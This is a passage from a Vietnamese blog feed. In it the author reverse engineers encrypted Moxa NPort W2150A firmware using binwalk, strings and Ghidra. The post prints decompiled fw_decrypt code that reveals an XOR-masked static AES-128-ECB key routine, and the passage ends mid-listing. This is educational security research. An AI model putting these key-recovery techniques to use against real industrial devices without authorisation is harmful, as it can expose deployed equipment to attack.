<p>Trong <a href="/vi/posts/2024/06/l%E1%BA%ADp-tr%C3%ACnh-h%E1%BB%87-%C4%91i%E1%BB%81u-h%C3%A0nh-boot-sector-ph%E1%BA%A7n-1/">bài đăng tiếp theo</a>, chúng ta sẽ học về boot sector và cách làm ra 1 cái boot sector.</p>
]]></content>
        </item>
        
        <item>
            <title>Phá mã phần mềm điều khiển của jack cắm kết nối WiFi</title>
            <link>https://namberino.github.io/vi/posts/2024/04/ph%C3%A1-m%C3%A3-ph%E1%BA%A7n-m%E1%BB%81m-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-jack-c%E1%BA%AFm-k%E1%BA%BFt-n%E1%BB%91i-wifi/</link>
            <pubDate>Fri, 26 Apr 2024 12:02:12 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/04/ph%C3%A1-m%C3%A3-ph%E1%BA%A7n-m%E1%BB%81m-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-jack-c%E1%BA%AFm-k%E1%BA%BFt-n%E1%BB%91i-wifi/</guid>
            <description>&lt;p&gt;Mình đã học dịch ngược, hệ thống nhúng và phần mềm điều khiển hệ thống nhúng khá lâu rồi. Dạo gần đây mình lại nghĩ &amp;ldquo;Sao mình không kết hợp 2 kĩ năng này để làm 1 cái gì đấy hay?&amp;rdquo;. Thế nên mình thử sức bản thân bằng cách phá mã của 1 phần mềm điều khiển đã được mã hóa của 1 jack cắm kết nối WiFi. Mình đã ghi lại quá trình phá mã và cách suy nghĩ của mình trong bài blog này.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Mình đã học dịch ngược, hệ thống nhúng và phần mềm điều khiển hệ thống nhúng khá lâu rồi. Dạo gần đây mình lại nghĩ &ldquo;Sao mình không kết hợp 2 kĩ năng này để làm 1 cái gì đấy hay?&rdquo;. Thế nên mình thử sức bản thân bằng cách phá mã của 1 phần mềm điều khiển đã được mã hóa của 1 jack cắm kết nối WiFi. Mình đã ghi lại quá trình phá mã và cách suy nghĩ của mình trong bài blog này.</p>
<h2 id="về-thiết-bị">Về thiết bị</h2>
<p>Gần đây mình cũng đọc được 1 lỗ hổng trong thiết bị jack cắm <a href="https://www.moxa.com/en/products/industrial-edge-connectivity/serial-device-servers/wireless-device-servers/nport-w2150a-w2250a-series"><em>Moxa NPort W2150A Serial-To-Wifi</em></a>, lỗ hổng này sử dụng buffer overflow dạng stack. Xong mình nghĩ là mình cũng muốn thử làm 1 dự án liên quan đến bên bảo mật cho thiết bị này. Bởi vì thiết bị này có phần mềm đã được mã hóa, mình quyết định sẽ cố phá mã để có thể lấy được mã nguồn của phần mềm điều khiển.</p>
<p>Mình muốn bắt đầu với 1 phiên bản cũ hơn của phần mềm điều khiển của thiết bị này. Mình tìm được phiên bản <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom"><em>v2.2</em></a>, được xuất bản vào khoảng 2019. MÌnh sẽ sử dụng phiên bản này.</p>
<h2 id="phân-tích-phần-mềm">Phân tích phần mềm</h2>
<p>Sau khi đọc về note xuất bản và doc cho phiên bản 2.2 và các phiên bản cũ hơn, mình tìm thấy đc 1 phần khá thú vị trong <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/W2250A%20Series_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom_Software%20Release%20History.pdf">note xuất bản</a> của phiên bản <em>1.11</em>:</p>

    <img src="/img/nport-firmware/nport-firmware-version11-release-note.png"  alt="Note xuất bản phiên bản 1.11"  class="center"  style="padding: 10px"  />


<p>Phiên bản <em>1.11</em> là phiên bản tiên quyết cho phiên bản <em>2.2</em>. Tức là mình cần phiên bản <em>1.11</em> để có thể tải phiên bản <em>2.2</em>. Mình nghĩ là phần mã hóa cho phần mềm điều khiển được thêm vào trong phiên bản <em>2.2</em>. Thế nên mình đã tải phiên bản <a href="https://www.moxa.com/Moxa/media/PDIM/S100000210/moxa-nport-w2150a-w2250a-series-firmware-1.11.rom">v1.11</a> và bắt đầu phân tích phiên bản này.</p>
<p>Đầu tiên, mình dùng <code>binwalk</code>. công cụ này cho phép mình &ldquo;bước&rdquo; qua cả file nhị phân và tìm các định dạng file và các định dạng nén trong phần mềm. Câu lệnh này cũng có nhiều công cụ phân tích nhị phân khác nhau.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-v2.2.rom
</span></span></code></pre></div><p>Khi mình chạy câu lệnh <code>binwalk</code> trên, mình được kết quả là 1 file <code>MySQL</code>. Đây là 1 báo động giả bởi vì mình không nghĩ là 1 jack cắm kết nối WiFi sẽ cần sử dụng database.</p>
<p>Tiếp theo thì mình thử <code>binwalk</code> phiên bản 1.11:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div>
    <img src="/img/nport-firmware/nport-firmware-older-version-binwalk.png"  alt="NPort firmware phiên bản 1.11 binwalk"  class="center"  style="padding: 10px"  />


<p>Output này xác nhận là phiên bản <em>1.11</em> không bị mã hóa. Trong output này có 2 điều khá thú vị: 2 hệ thống file <code>squashfs</code> đã được nén bằng <code>gzip</code>. <code>squashfs</code> là cả 1 hệ thống file của Linux.</p>
<p>Mình sẽ thử giải nén phần mềm này:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>binwalk -e moxa-nport-w2150a-w2250a-series-firmware-1.11.rom
</span></span></code></pre></div><p>Câu lệnh này sẽ giải nén phiên bản <em>1.11</em> vào tệp <code>_moxa-nport-w2150a-w2250a-series-firmware-1.11.rom.extracted</code>:</p>

    <img src="/img/nport-firmware/nport-firmware-extracted-screenshot.png"  alt="NPort firmware phiên bản 1.11 giải nén"  class="center"  style="padding: 10px"  />


<p>Trong folder đó có các folder con <code>squashfs-root</code>, các folder này có hệ thống file Linux của phần mềm này. Trước khi mình truy cập folder này thì mình cần phân quyền đúng cho folder đó:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo chmod -R <span style="color:#d19a66">770</span> squashfs-root*
</span></span></code></pre></div><p>Giờ mình có thể truy cập các folder <code>squashfs-root</code>:</p>

    <img src="/img/nport-firmware/nport-firmware-old-version-filesystem.png"  alt="NPort firmware phiên bản 1.11 hệ thống file đã được giải nén"  class="center"  style="padding: 10px"  />


<p>Sau khi nhìn qua các folder trong phần mềm này, mình tìm được 1 file có tên là <code>libupgradeFirmware.so</code> trong folder <code>lib</code> của folder <code>squashfs-root-1</code>. Bởi vì phiên bản <em>2.2</em> cần có phiên bản <em>1.11</em>, mình đoán là file <code>libupgradeFirmware.so</code> sẽ có thông tin về các phần mềm này đã được mã hóa. Mình sẽ phân tích và dịch ngược file nhị phân này:</p>
<h2 id="dịch-ngược-file-libupgradefirmwareso">Dịch ngược file libupgradeFirmware.so</h2>
<p>Mình sẽ dùng <a href="https://ghidra-sre.org/"><code>Ghidra</code></a> để dịch ngược.</p>
<p>Trước hết thì mình sẽ dùng câu lệnh <code>strings</code> để xem có những hàm gì trong file này:</p>

    <img src="/img/nport-firmware/nport-firmware-strings.png"  alt="NPort firmware strings"  class="center"  style="padding: 10px"  />


<p>Chúng ta có thể thấy được 1 vài hàm có chữ &ldquo;AES&rdquo; trong đó, tức là firmware này sẽ dùng thuật toán mã hóa khối <strong>AES</strong>. Mình chạy lệnh <code>grep</code> để tìm các hàm có chứ &ldquo;AES&rdquo;:</p>

    <img src="/img/nport-firmware/nport-firmware-strings-grep-aes.png"  alt="NPort firmware strings grep aes"  class="center"  style="padding: 10px"  />


<p>Firmware này dùng AES ở chế độ <strong>ECB</strong> (Electronic Code Block). Bởi vì chế độ <strong>ECB</strong> tạo text mã hóa (ciphertext) giống nhau với text thường (plaintext) giống nhau, hacker có thể suy ra khóa bí mật và phá mã dữ liệu đã được mã hóa bằng chế độ <strong>ECB</strong>. Đây là 1 lỗ hổng lớn mà mình có thể tấn công.</p>
<p>Mình cũng thấy từ output của <code>strings</code> có 1 vài hàm có chữ <code>fw</code> trong đó. Mình đoán là đó là viết tắt cho từ &ldquo;firmware&rdquo;. Mình sẽ chạy <code>grep</code> với chữ <code>fw</code> để xem có những hàm nào:</p>

    <img src="/img/nport-firmware/nport-firmware-strings-fw.png"  alt="NPort firmware Ghidra fw_decrypt function"  class="center"  style="padding: 10px"  />


<p>Hàm <code>fw_decrypt</code> chắc là 1 hàm dùng để giải mã firmware, hàm này chắc là 1 hàm khá quan trọng.</p>
<p>Mình sẽ thử mở hàm này lên trong Ghidra:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined8</span> <span style="color:#61afef;font-weight:bold">fw_decrypt</span>(<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_3</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">puVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">decrypt_size</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">__src</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">local_24</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uStack_20</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">==</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)<span style="color:#d19a66">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\x01&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> ((((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#d19a66">0x29</span>) <span style="color:#56b6c2">||</span> (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span>)) <span style="color:#56b6c2">||</span>
</span></span><span style="display:flex;"><span>        (<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>))) <span style="color:#56b6c2">||</span> ((<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">-</span> <span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&amp;</span> <span style="color:#d19a66">0xf</span>) <span style="color:#56b6c2">!=</span> <span style="color:#d19a66">0</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffe</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">while</span> (<span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">!=</span> <span style="color:#e06c75">ubuf</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0xa7</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">1</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x8b</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">2</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">0x2d</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span>[<span style="color:#d19a66">3</span>] <span style="color:#56b6c2">^</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pbVar3</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_24</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uStack_20</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">param_3</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">ecb128Decrypt</span>((<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,(<span style="color:#e06c75">uchar</span> <span style="color:#56b6c2">*</span>)<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">decrypt_size</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">passwd</span><span style="color:#d19a66">.3309</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">8</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#c678dd">if</span> (((<span style="color:#d19a66">0x28</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>) <span style="color:#56b6c2">&amp;&amp;</span> ((<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">uVar4</span>)) <span style="color:#56b6c2">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>         (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\0&#39;</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">__src</span> <span style="color:#56b6c2">=</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> (<span style="color:#e06c75">uint</span>)<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">*</span> <span style="color:#d19a66">4</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x24</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#61afef;font-weight:bold">memcpy</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_24</span>,<span style="color:#e06c75">__src</span>,<span style="color:#d19a66">4</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">=</span> (<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span>)<span style="color:#61afef;font-weight:bold">cal_crc32</span>((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">__src</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">4</span>,<span style="color:#e06c75">uVar4</span> <span style="color:#56b6c2">+</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xd</span>) <span style="color:#56b6c2">+</span> <span style="color:#d19a66">10</span>) <span style="color:#56b6c2">*</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">4</span>,
</span></span><span style="display:flex;"><span>                                   <span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#c678dd">if</span> (<span style="color:#e06c75">puVar2</span> <span style="color:#56b6c2">==</span> <span style="color:#e06c75">local_24</span>) {
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> ((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">&lt;</span> (<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">uVar4</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffb</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">goto</span> <span style="color:#e06c75">LAB_0001191c</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xfffffffc</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#e06c75">LAB_0001191c</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#61afef;font-weight:bold">CONCAT44</span>(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uVar1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Sau khi đọc qua code của <code>fw_decrypt</code> 1 lượt thì mình thấy là <code>fw_decrypt</code> có gọi 1 hàm tên là <code>ecb128Decrypt</code>. Đây chắc là hàm giải mã AES 128 ở chế độ ECB. Hàm này trực tiếp gọi các hàm AES trong thư viện <em>OpenSSL</em>. Mình có thể dùng công cụ của <em>OpenSSL</em> để giải mã phần mềm firmware này. Nhưng mình sẽ cần khóa dùng cho việc mã hóa phần mềm này để có thể giải mã nó.</p>
<h2 id="dịch-ngược-hàm-ecb128decrypt">Dịch ngược hàm ecb128Decrypt</h2>
<p>Mình sẽ bắt đầu dịch ngược hàm <code>ecb128Decrypt</code> này:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-function-reversed.png"  alt="NPort firmware ecb128Decrypt hàm dịch ngược"  class="center"  style="padding: 10px"  />


<p>Trong lúc phân tích mình sẽ đặt tên lại và đặt kiểu dữ liệu lại cho các biến trong phần mềm firmware này.</p>
<p>Mình sẽ bắt đầu với hàm AES. Hàm <code>AES_set_decrypt_key</code> sẽ có input là khóa người dùng và mở rộng nó ra thành 1 khóa AES. Hàm <code>AES_set_decrypt_key</code> này sẽ sử dụng biến <code>auStack_30</code>. Trong <a href="https://www.openssl.org/docs/">tài liệu chính thức của OpenSSL</a>, input đầu tiên của hàm này là khóa người dùng. Thế nên mình có thể đặt tên<code>auStack_30</code> thành <code>user_key</code>. <code>AStack_124</code> là khóa AES thế nên mình sẽ đặt tên nó thành <code>aes_key</code>. Khóa AES này sẽ được sử dụng cho việc giải mã phần mềm.</p>
<p>Hàm này cũng cần lấy 1 tham số là kích cỡ khóa. Trong chương trình này thì kích cỡ khóa là <em>0x80</em> (là <em>128</em> trong số nguyên). Tức là firmware này sử dụng khóa AES với kích cỡ khóa là <em>128-bit</em>. Mình sẽ đổi kiểu dữ liệu của <em>0x80</em> thành số nguyên.</p>
<p>Tiếp theo, trên hàn <code>strncpy</code>, dòng này đang copy 16 byte từ <code>param_4</code> sang <code>auStack_30</code> (khóa người dùng <code>user_key</code>). Tức là <code>param_4</code> là 1 khóa giải mã bởi vì <code>user_key</code> sẽ được sử dụng trong hàm giải mã AES. Mình sẽ đặt tên cho biến <code>param_4</code> thành <code>decrypt_key</code>.</p>
<p>Tiếp theo, ở dòng có biến <code>in</code> and <code>out</code>, các biến này có chứa dữ liệu của <code>param_1</code> và <code>param_2</code> và các dữ liệu này được cộng với sai số là <em>0x10</em> (<em>16</em> trong số nguyên). 2 biến này cũng được cho vào hàm <code>AES_ecb_encrypt</code>.</p>
<p>Hàm <code>AES_ecb_encrypt</code> sẽ cần 1 buffer đầu vào, 1 buffer đầu ra, 1 khóa AES và chế độ mã hóa. Bởi vì hàm <code>AES_ecb_encrypt</code> có chế độ mã hóa 0 ở trường hợp này, hàm <code>AES_ecb_encrypt</code> sẽ được đặt vào chế độ giải mã. Thế hàm này sẽ giải mã dữ liệu trong buffer đầu vào dùng khóa AES và cho dữ liệu đã được giải mã vào buffer đầu ra.</p>
<p>Mình suy ra là biến <code>param_1</code> và <code>param_2</code> là buffer đầu vào và buffer đầu ra. Mình sẽ đặt tên <code>param_1</code> thành <code>decrypt_in</code> và <code>param_2</code> thành <code>decrypt_out</code> và đổi kiễu dữ liệu thành <code>uchar*</code> bởi vì biến <code>in</code> và <code>out</code> đều là <code>uchar*</code>.</p>
<p>Tiếp theo, biến <code>iVar1</code> biến đếm được dùng cho vòng lặp, vòng lặp này chỉ dừng khi biến đếm bằng <code>param_3 + -0x28</code>. Thế nên <code>param_3</code> sẽ là kích cỡ của buffer đầu vào. Mình sẽ đặt tên <code>param_3</code> thành <code>decrypt_size</code>. <code>decrypt_size</code> cần được cộng với sai số là <code>-0x28</code>, điều này có nghĩa là file này sẽ có 1 vài byte đệm ở đầu file. Lúc mình dùng <code>hexdump</code>, mình tìm được 1 vài byte <code>00</code> ở đầu file, đó chắc là lý do tại sao <code>decrypt_size</code> cần được cộng với sai số <em>-0x28</em> (40 byte)</p>
<p>Đây là hàm đã được đặt tên lại:</p>

    <img src="/img/nport-firmware/nport-firmware-ecb128decrypt-reversed-renamed.png"  alt="NPort firmware ecb128Decrypt hàm đã được đặt tên lại"  class="center"  style="padding: 10px"  />


<p>Thế là mình đã hiểu được cách hàm <code>ecb128Decrypt</code> hoạt động: Nó lấy 1 buffer đầu vào (<code>decrypt_in</code>), giải mã nó với khóa (<code>decrypt_key</code>), và cho kết quả vào đầu ra (<code>decrypt_out</code>).</p>
<h2 id="dịch-ngược-hàm-fw_decrypt">Dịch ngược hàm fw_decrypt</h2>
<p>Tiếp theo, mình sẽ phân tích hàm <code>fw_decrypt</code> và dịch ngược nó lại.</p>
<blockquote>
<p><strong>Note</strong>: Code của hàm<code>fw_decrypt</code> khá là dài thế nên mình sẽ copy nó vào 1 block code thay vì chụp ảnh</p></blockquote>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined8</span> <span style="color:#61afef;font-weight:bold">fw_decrypt</span>(<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_3</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">puVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">byte</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pbVar3</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">decrypt_size</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#e06c75">uVar4</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">__src</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">uint</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">local_24</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">uStack_20</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">decrypt_size</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">==</span> (<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span>)<span style="color:#d19a66">0x0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">uVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0xffffffff</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">char</span> <span style="color:#56b6c2">*</span>)((<span style="color:#e5c07b">int</span>)<span style="color:#e06c75">param_1</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0xe</span>) <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#39;\x01&#39;</span>) {
